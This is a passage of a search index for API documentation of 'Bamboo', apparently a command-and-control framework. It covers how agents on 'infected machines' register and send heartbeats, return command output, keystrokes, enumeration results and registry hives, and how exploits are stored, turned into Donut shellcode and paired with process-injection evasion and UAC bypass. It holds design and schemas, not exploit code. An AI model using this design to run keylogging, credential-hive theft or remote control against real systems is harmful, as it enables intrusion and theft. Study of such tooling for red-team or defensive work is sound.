Example","text":"<pre><code>True\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#delete_user","title":"delete_user","text":"<p>Remove existing user from the database</p>"},{"location":"Teamserver/Database/model_users.html#usage_4","title":"Usage","text":"<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#description_4","title":"Description","text":"<p>delete_user is called when a Bamboo Client wants to remove a set of credentials from Bamboo Teamserver users collection. Before deleting the credential, the model will determine if the username given exist, if it exist, Bamboo Teamserver will delete that set of credential.</p>"},{"location":"Teamserver/Database/model_users.html#function-arguments_4","title":"Function Arguments","text":"Field Type Description username String Username to delete"},{"location":"Teamserver/Database/model_users.html#arguments-example_3","title":"Arguments Example","text":"<pre><code>delete_user(\"bambooUserNew\")\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#database-method_4","title":"Database Method","text":"Method Collection Return find_one user Determine if the username exist delete_many user Delete credentials from the database"},{"location":"Teamserver/Database/model_users.html#function-return_4","title":"Function Return","text":"Type Description Dictionary Status of insertion"},{"location":"Teamserver/Database/model_users.html#return-example_4","title":"Return Example","text":"<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#find_one","title":"find_one","text":"<p>Retrieve a specific user information</p>"},{"location":"Teamserver/Database/model_users.html#usage_5","title":"Usage","text":"<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#description_5","title":"Description","text":"<p>find_one main objective is to determine if a username exist in the database. It will determine if the user exist in the database, users collection, before returning the status back to Bamboo Teamserver.</p>"},{"location":"Teamserver/Database/model_users.html#function-arguments_5","title":"Function Arguments","text":"Field Type Description username String Username to find"},{"location":"Teamserver/Database/model_users.html#arguments-example_4","title":"Arguments Example","text":"<pre><code>find_one(\"bambooUserNew\")\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#database-method_5","title":"Database Method","text":"Method Collection Return find_one user Determine if the username exist"},{"location":"Teamserver/Database/model_users.html#function-return_5","title":"Function Return","text":"Type Description Dictionary Existence of user"},{"location":"Teamserver/Database/model_users.html#return-example_5","title":"Return Example","text":"<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html","title":"/agent","text":""},{"location":"Teamserver/api_reference/agent.html#agent-heartbeats","title":"Agent Heartbeats","text":"<p>Record Bamboo Agent heartbeat</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint","title":"Endpoint","text":"<pre><code>POST /agent/heartbeat\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description","title":"Description","text":"<p>Agent heartbeats endpoint is for Bamboo Agents to 'ping' the Bamboo Teamserver after their initial connection. This heartbeat mechanism helps determine if a Bamboo Agent is still 'alive' and running. The initial connection will give Bamboo Agents 5 seconds before the next heartbeat is expected. After that, the Bamboo Agent will continue sending their heartbeat at random intervals between 5 to 10 seconds. This endpoint will use the model add_heartbeat to repeatedly update the collection heartbeats.</p> <p>After obtaining the 2 data in the request body from a Bamboo Agent, the Bamboo Teamserver will take the time that the request was made and compare it with the expected_heartbeat column in the database. Refer to db collection heartbeats for more information.</p> <p>If the current time is later than the expected time, it would mean that the Bamboo Agent was 'dead' and it became 'alive' after a while. While if the current time matches the expected time for the next heartbeat, it would mean that the Bamboo Agent is 'punctual' and still alive.</p>"},{"location":"Teamserver/api_reference/agent.html#request-schema","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent heartbeat Integer Seconds before the next heartbeat"},{"location":"Teamserver/api_reference/agent.html#request-example","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 8\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"alive\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"Teamserver/api_reference/agent.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#registering-agent","title":"Registering Agent","text":"<p>Register new Bamboo Agent</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description_1","title":"Description","text":"<p>The Register Agent endpoint is called when a Bamboo Agent is executed. The Bamboo Agent will request for this endpoint to register itself into the Bamboo Teamserver and using the model check_agent_identifier, the Bamboo Teamserver will be able to generate unique agent identifiers and avoid duplicates.</p> <p>The Bamboo Teamserver will create a unique agent identifier for all Bamboo Agents. Once the agent identifier is created, the Bamboo Teamserver will update the database in the agents collection using  the model add_agent with the new Bamboo Agent information. Not only that, it will also update the heartbeats collection using the model add_heartbeat and give the agent 5 seconds of buffer time to request for the next heartbeat.</p> <p>After the procedure is completed, the Bamboo Teamserver will broadcast to all connected Bamboo Clients that a new Bamboo Agent is connected, with its agent identifier. From there, Bamboo Client users will be able to interact and view the information using commands. For more information on commands, do refer to commands.</p>"},{"location":"Teamserver/api_reference/agent.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description hostname String Hostname if infected machine publicIP String Public IP address of infected machine privateIP String Private IP address of infected machine Integrity String Privilege level of Bamboo Agent"},{"location":"Teamserver/api_reference/agent.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"hostname\": \"bambooMachine\",\n    \"publicIP\": \"39.100.49.231\",\n    \"privateIP\": \"192.168.45.7\",\n    \"Integrity\": \"medium\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"listener_status\": \"connected\", \"agent_identifier\", \"5zrire9a\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"Teamserver/api_reference/agent.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"listener_status\": \"connected\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#command-response","title":"Command Response","text":"<p>Store response of command for <code>cmd</code> Bamboo Client command</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /agent/agent_response\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description_2","title":"Description","text":"<p>Command Response endpoint is part of the <code>cmd</code> command component. This endpoint receives the response of the Bamboo Agent after the Bamboo Client user sends a command over. The Bamboo Teamserver will then update a dictionary in the global variable for /handler/handler_output API to receive it, which details are in here. </p>"},{"location":"Teamserver/api_reference/agent.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent response String Result of command (e.g. <code>whoami</code>)"},{"location":"Teamserver/api_reference/agent.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"response\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"response\", \"bambooMachine\\panda\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"Teamserver/api_reference/agent.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"response\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#file-download","title":"File Download","text":"<p>Download exploit files by name</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint_3","title":"Endpoint","text":"<pre><code>GET /agent/download/&amp;lt;filename&amp;gt;\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description_3","title":"Description","text":"<p>During exploiting phrase, if drop file is required, Bamboo Agent will request for this API to download the exploit file. All exploit files is located in <code>/exploits</code> folder</p>"},{"location":"Teamserver/api_reference/agent.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> File Success <code>404</code> Null Invalid Body"},{"location":"Teamserver/api_reference/agent.html#keylog-result","title":"Keylog Result","text":"<p>Store post exploit (<code>keylog</code>) result (keystrokes)</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /agent/post_exploit/keylog\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description_4","title":"Description","text":"<p>Keylog Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to stop recording keystrokes. There will be error checking to determine if there were any error, if there are no errors, the Bamboo Teamserver will send the keystroke to the user via WebSocket.</p>"},{"location":"Teamserver/api_reference/agent.html#request-schema_3","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>start</code>, <code>error</code> keystroke String Key strokes recorded handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"Teamserver/api_reference/agent.html#request-example_3","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\",\n    \"keystroke\": \"keystrokesrecorded\",\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when logging keystrokes"},{"location":"Teamserver/api_reference/agent.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description keylogMsg String Keystrokes recorded agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/agent.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"keylogMsg\": \"keystrokesrecorded\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#enumerate-result","title":"Enumerate Result","text":"<p>Store enumeration (<code>enum</code>) result</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /agent/post_exploit/enumerate\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description_5","title":"Description","text":"<p>Enumerate Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to enumerate the infected machine. There will be error checking to determine if there were any error, if there are no errors, the Bamboo Teamserver will send the enumerate results to the user via WebSocket.</p>"},{"location":"Teamserver/api_reference/agent.html#request-schema_4","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>error</code> result String Enumerate Result handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"Teamserver/api_reference/agent.html#request-example_4","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\",\n    \"result\": &lt;a very long list of string&gt;,\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when enumerating"},{"location":"Teamserver/api_reference/agent.html#response-example_4","title":"Response example","text":"<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#websocket-schema_1","title":"WebSocket schema","text":"Websocket body Field Type Description enumerateMsg String Enumerated result agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/agent.html#websocket-example_1","title":"WebSocket example","text":"<pre><code>{\n    \"enumerateMsg\": &lt;a very long list of string&gt;,\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#sss_retrieve-result","title":"SSS_Retrieve Result","text":"<p>Store SSS_Retrieve (<code>retrieve</code>) result</p>"},{"location":"Teamserver/api_reference/agent.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /agent/post_exploit/sss_retrieve\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#description_6","title":"Description","text":"<p>SSS_Retrieve Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to Retrieve registry hives from the infected machine. There will be error checking to determine if there were any error, if there are no errors, the Bamboo Teamserver will send the retrieved results to the user via WebSocket.</p>"},{"location":"Teamserver/api_reference/agent.html#request-schema_5","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>error</code> files String Dictionary of binary handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"Teamserver/api_reference/agent.html#request-example_5","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\",\n    \"result\": &lt;dictionary of binary&gt;,\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when enumerating"},{"location":"Teamserver/api_reference/agent.html#response-example_5","title":"Response example","text":"<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/agent.html#websocket-schema_2","title":"WebSocket schema","text":"Websocket body Field Type Description retrieveMsg String Enumerated result agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/agent.html#websocket-example_2","title":"WebSocket example","text":"<pre><code>{\n    \"retrieveMsg\": &lt;dictionary of binary&gt;,\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html","title":"/auth","text":""},{"location":"Teamserver/api_reference/authentication.html#server-status","title":"Server Status","text":"<p>Check if server is up</p>"},{"location":"Teamserver/api_reference/authentication.html#endpoint","title":"Endpoint","text":"<pre><code>POST /auth/\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#description","title":"Description","text":"<p>Bamboo Client will always request for this endpoint before requesting for credentials. A simple endpoint that allows Bamboo Client to determine if the Bamboo Teamserver hosted in the address input is online.</p>"},{"location":"Teamserver/api_reference/authentication.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"online\"} Server is online"},{"location":"Teamserver/api_reference/authentication.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"online\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#user-login","title":"User Login","text":"<p>Authenticates user credentials for access</p>"},{"location":"Teamserver/api_reference/authentication.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /auth/login\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#description_1","title":"Description","text":"<p>This endpoint validates the credential sent by the user from Bamboo Client. Using the model login_auth, the Bamboo Teamserver will determine if the credentials are valid. If it is valid, the Bamboo Teamserver will generate a JSON Web Token (JWT) for the Bamboo Client user and respond back to the user.</p>"},{"location":"Teamserver/api_reference/authentication.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username input by user password String Password input by user"},{"location":"Teamserver/api_reference/authentication.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"password\": \"adnap\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"message\": \"Login successful\", \"jwt_token\": jwt_token} Successfully Login <code>400</code> {\"status\": \"error\", \"message\": \"User not found\"} Invalid Username <code>401</code> {\"status\": \"error\", \"message\": \"Incorrect password\"} Incorrect Password <code>404</code> {\"status\": \"error\", \"message\": \"Something went wrong!\"} Invalid Body"},{"location":"Teamserver/api_reference/authentication.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"message\": \"Login successful\",\n    \"jwt_token\": jwt_token\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#user-logout","title":"User Logout","text":"<p>Notifies the Bamboo Teamserver that the user has logged out</p>"},{"location":"Teamserver/api_reference/authentication.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /auth/logout\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#description_2","title":"Description","text":"<p>This endpoint is called when the Bamboo Client user wants to log off using the <code>exit</code>/<code>quit</code> command. The Bamboo Teamserver will update the user status in the database using the model users and will generate a log. The Bamboo Teamserver will also remove the username from the WebSocket Client dictionary.</p>"},{"location":"Teamserver/api_reference/authentication.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver/api_reference/authentication.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"logout\"} Successfully Logout <code>404</code> {\"message\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/authentication.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"message\": \"logout\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#check-agent-status","title":"Check Agent Status","text":"<p>Determine agent status and return back to Bamboo Client</p>"},{"location":"Teamserver/api_reference/authentication.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#description_3","title":"Description","text":"<p>When Bamboo Client user uses commands such as {<code>exploit</code> and <code>cmd</code>}, Bamboo Client will need to determine if the Bamboo Agent in use is online. This endpoint uses the model obtain_status and will return the status of the specific Bamboo Agent.</p>"},{"location":"Teamserver/api_reference/authentication.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/authentication.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/authentication.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent_status\": agent_status} Successfully Logout <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/authentication.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent_status\": \"online\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html","title":"/exploit","text":""},{"location":"Teamserver/api_reference/exploit.html#stop-exploit","title":"Stop Exploit","text":"<p>Stop exploit process. For logging purposes</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint","title":"Endpoint","text":"<pre><code>POST /exploit/quit\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description","title":"Description","text":"<p>When a Bamboo Client user wants to stop the process of exploiting a Bamboo Agent, Bamboo Client will call this endpoint to notify the Bamboo Teamserver about it, for logging purposes.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/exploit.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"stopped\"} Successfully notified <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/exploit.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"stopped\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#exploit-agent","title":"Exploit Agent","text":"<p>Handles configuration sent from Bamboo Client to produce a valid payload to Bamboo Agent</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /exploit/send_config\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_1","title":"Description","text":"<p>Exploit Agent is called after a Bamboo Client user finish configuring the exploit to use on the Bamboo Agent. The Bamboo Teamserver will first convert the selected evasion method into a standardised one. Next, it will perform a sequence of logic which can be seen in the flowchart below. If Donut is required, the Bamboo Teamserver will run the Donut function with the given Donut configuration input by the user. The Donut function will turn the exploit into shellcode before converting the shellcode into hexadecimals. Finally, the Bamboo Teamserver will broadcast a WebSocket message to the Bamboo Agent using its agent identifier to give it its command.</p> <p></p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent need_donut Boolean Determines if Donut is required exploit_to_use String Exploit name evasion_method String Evasion method chosen app_version String Version of is affected by exploit uac_bypass Boolean Determines if payload require uac_bypass donut_config_data List of Integers Donut configurations (if applicable) file2donut String File name to generate shellcode using Donut (if applicable)"},{"location":"Teamserver/api_reference/exploit.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"need_donut\": true,\n    \"exploit_to_use\": \"filmora.exe\",\n    \"evasion_method\": \"Process Injection [Injection]\",\n    \"app_version\": \"Wondershare Filmora v11\",\n    \"uac_bypass\": true,\n    \"donut_config_data\": [3, 2, 1, 2],\n    \"file2donut\": \"uac_bypass.exe\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully notified <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver/api_reference/exploit.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description app_version String App version that exploit targets command String exploit method String Evasion method for uac_bypass/exploit shellcode String Hexadecimal of exploit file drop_file String File to download from the Bamboo Teamserver uac_bypass String If uac_bypass is needed, will contain evasion method. Else an empty string"},{"location":"Teamserver/api_reference/exploit.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"app_version\": \"Panda\",\n    \"command\": \"exploit\",\n    \"method\": \"Gadget Injection\",\n    \"shellcode\": &lt;Exploit shellcode in Hexadecimal&gt;,\n    \"drop_file\": \"\",\n    \"uac_bypass\": \"\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#view-exploits","title":"View Exploits","text":"<p>View all exploits</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /exploit/view_all\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_2","title":"Description","text":"<p>When Bamboo Client uses the command <code>exp</code>, the Bamboo Teamserver will gather all exploits in the database using the model view_all and returns it back to Bamboo Client.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver/api_reference/exploit.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"exploit_data\": exploit_data} Successful and there are exploits <code>200</code> {\"status\": \"failed\", \"exploit_data\": exploit_data} Successful but no exploits <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/exploit.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"exploit_data\": &lt;dictionary of exploit data&gt;\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#add-exploits","title":"Add Exploits","text":"<p>Add new exploit</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /exploit/add\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_3","title":"Description","text":"<p>When Bamboo Client uses the command <code>add</code>, the Bamboo Teamserver will upload the new exploit information into the database using the model add_exploit. Additionally, using <code>request.files</code>, the Bamboo Teamserver will place the exploit file into /exploit folder.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_3","title":"Request schema","text":"Request body Field Type Description username String Username of user configurations List Contains information of new exploit files Bytes Bytes of new exploit file (not sent in request body)"},{"location":"Teamserver/api_reference/exploit.html#request-example_3","title":"Request example","text":"Request body <pre><code>{\n    \"username\": \"bambooUser\",\n    \"configurations\": [\"newExploit.exe\", \"app_version_Bamboo\", \"user\", \"system\", false, true, true, \"\"]\n}\n</code></pre> multipart/form-data <pre><code>{\n    \"file\": &lt;file bytes&gt;\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully added new exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Failed to add into database <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver/api_reference/exploit.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#delete-exploits","title":"Delete Exploits","text":"<p>Delete a exploit</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /exploit/delete\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_4","title":"Description","text":"<p>When Bamboo Client uses the command <code>delete</code>, the Bamboo Teamserver will attempt to remove the exploit specified by the Bamboo Client user using the model del_exploit. The Bamboo Teamserver will remove the information related to the exploit stored in the database, as well as the file stored in the Bamboo Teamserver under the /exploits folder.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_4","title":"Request schema","text":"Request body Field Type Description username String Username of user exploit_name String Name of exploit to delete"},{"location":"Teamserver/api_reference/exploit.html#request-example_4","title":"Request example","text":"Request body <pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully deleted specified exploit <code>200</code> {\"status\": \"does not exist\"} No such exploit exist in the database <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/exploit.html#response-example_4","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#exploit-existence","title":"Exploit Existence","text":"<p>Determine if an exploit exist in the Bamboo Teamserver</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /exploit/exist\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_5","title":"Description","text":"<p>Exploit Existence is used for when the command <code>modify</code> is called in the Bamboo Client. This endpoint will help determine if a exploit exist in the Bamboo Teamserver and return the exploit information if it exist before allowing the Bamboo Client users to start making changes. It uses the model find_one to locate the specified exploit.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_5","title":"Request schema","text":"Request body Field Type Description username String Username of user exploit_name String Name of exploit to delete"},{"location":"Teamserver/api_reference/exploit.html#request-example_5","title":"Request example","text":"Request body <pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"data\": data} Found the exploit in the database <code>200</code> {\"status\": \"does not exist\"} No such exploit exist in the database <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/exploit.html#response-example_5","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"data\": data\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#modify-exploit-cli","title":"Modify Exploit (CLI)","text":"<p>Modifies exploit specified</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /exploit/modify\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_6","title":"Description","text":"<p>Modify Exploit is called when CLI Bamboo Client calls the {<code>modify</code> command}. The Bamboo Client will sent the set of changes to be made, which can vary in sizes and key depending on what needs to be modified. If the exploit name is to be modified, the Bamboo Teamserver will change the exploit file name accordingly. Using the model modify, the Bamboo Teamserver will be able to make dynamic changes to the information of the exploit stored in the database.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_6","title":"Request schema","text":"Request body Field Type Description username String Username of user exploit_name String Name of exploit to modify changes Dictionary Dictionary of changes to be made (dynamic)"},{"location":"Teamserver/api_reference/exploit.html#request-example_6","title":"Request example","text":"Request body <pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n    \"changes\": {\n        \"name\": \"new_name.exe\", \n        \"app_version\": \"new_app_version\"\n    }\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully modified specified exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver/api_reference/exploit.html#response-example_6","title":"Response example","text":"<pre><code>{\n    \"status\": 